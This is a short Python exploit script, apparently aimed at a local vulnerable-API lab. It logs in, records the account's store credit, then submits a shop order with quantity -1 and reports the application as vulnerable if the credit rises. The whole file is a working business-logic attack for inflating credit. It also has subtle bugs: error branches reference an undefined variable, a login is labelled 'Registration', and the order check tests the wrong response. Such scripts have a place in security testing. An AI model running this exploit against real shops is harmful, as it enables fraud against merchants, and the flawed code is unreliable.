#!/usr/bin/env python3
import requests, json, sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <username> <password>")
    print(f"Example usage: ./vuln.py 'test1@test.com' 'TestTest12!'")
    print("Note: User needs to be created")
    sys.exit(1)
URL = "http://localhost:8888"
email = sys.argv[1]
password = sys.argv[2]
LOGIN_URL = URL + "/identity/api/auth/login"
SHOP_URL = URL + "/shop"
DASHBOARD_URL = URL + "/identity/api/v2/user/dashboard"
ORDER_URL = URL + "/workshop/api/shop/orders"

login_response = requests.post(LOGIN_URL,
                headers={"Content-Type": "application/json"},
                data=json.dumps({"email": email, "password": password}))
print(login_response.text)
print("Registration successful" if login_response.ok else f"Registration failed: {response.text}")

login_data = login_response.json()
token = login_data.get("token")

if not token:
    print("Token not found in response")
    exit(1)

print(f"Token obtained: {token}")

auth_header = {
                "Authorization": f"Bearer {token}",
               "Content-Type": "application/json"
               }

dashboard_response = requests.get(DASHBOARD_URL,
                                   headers=auth_header)

if dashboard_response.ok:
    print("Dashboard data:")
    print(dashboard_response.json())

    credit = dashboard_response.json().get("available_credit")


else:
    print("Failed to access dashboard:", dashboard_response.status_code)
    print(dashboard_response.text)
    exit(1)


exploit_response = requests.post(ORDER_URL,
                headers=auth_header,
                data=json.dumps({"product_id": 1, "quantity": -1}))
print(exploit_response.text)
print("Order successful" if login_response.ok else f"Order failed: {response.text}")

final_credit = exploit_response.json().get('credit')

print("Current credit:" + str(credit))
print("Final credit:" + str(final_credit))

if final_credit > credit:
    print("[+] Application is vulnerable")
    exit(0)
else:
    print("[-] Application not vulnerable")
    exit(1)
